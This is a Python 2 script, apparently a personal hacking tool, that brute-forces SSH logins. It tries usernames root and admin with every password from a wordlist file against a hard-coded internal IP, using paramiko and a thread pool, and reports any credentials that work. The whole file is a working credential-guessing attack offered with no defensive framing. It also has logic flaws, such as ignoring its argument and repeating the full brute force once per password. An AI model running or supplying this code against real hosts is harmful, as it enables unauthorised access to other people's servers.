# -*- coding: utf-8 -*-
# @Time    : 2018/6/2 0002 11:06
# @Author  : Langzi
# @Blog    : www.langzi.fun
# @File    : SSH.py
# @Software: PyCharm
import sys
import paramiko
import threading
import socket
import time
from multiprocessing.dummy import Pool as pd
reload(sys)
sys.setdefaultencoding('utf-8')
s = socket.socket()
ip = '172.18.5.254'
dic_user=['root','admin']
dic_pass=list(set([x.replace('\n','') for x in open('password.txt','r').readlines()]))
def scan_ssh(ip):
    ip = '172.18.5.254'
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('SSH Brute')
        s = socket.socket()
        s.connect((str(ip), 22))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for uuser in dic_user:
                for ppass in dic_pass:
                    try:
                        print '[+]' + uuser + '|' + ppass
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, port=22, username=uuser, password=ppass, timeout=10)
                        client.close()
                        try:
                            print '----------------------------------'
                            print 'FOUND PASSWORD:'+uuser+':'+ppass
                            print '----------------------------------'
                            return ''
                            time.sleep(20000)
                        except Exception, e:
                            pass
                    except:
                        pass
        s.close()
    except:
        pass
# for x in range(50):
#     t = threading.Thread(target=scan_ssh,args=(ip,))
#     t.start()
#     t.join()
pool = pd(processes=8)
result = pool.map(scan_ssh,dic_pass)
pool.close()
pool.join()